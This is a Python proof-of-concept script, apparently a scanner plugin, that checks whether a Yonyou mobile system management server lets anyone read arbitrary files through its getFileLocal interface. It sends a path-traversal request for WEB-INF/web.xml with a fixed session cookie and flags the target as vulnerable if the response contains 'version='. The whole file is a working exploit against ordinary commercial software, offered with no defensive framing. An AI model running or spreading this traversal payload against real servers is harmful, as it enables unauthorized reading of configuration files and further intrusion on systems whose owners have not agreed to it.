import requests
import urllib

def verify(url):
    relsult = {
        'name': '用友移动系统管理getFileLocal接口存在任意文件读取',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Cookie': 'JSESSIONID=B9F1AC8D34E9DFD16A3A7A4B9CEE4EF9.server',
        'Connection': 'close'
    }
    vurl = urllib.parse.urljoin(url, "/portal/file?cmd=getFileLocal&fileid=..%2F..%2F..%2F..%2Fwebapps/nc_web/WEB-INF/web.xml")
    try:
        response = requests.get(vurl, headers=headers)
        if response.status_code == 200 and 'version=' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult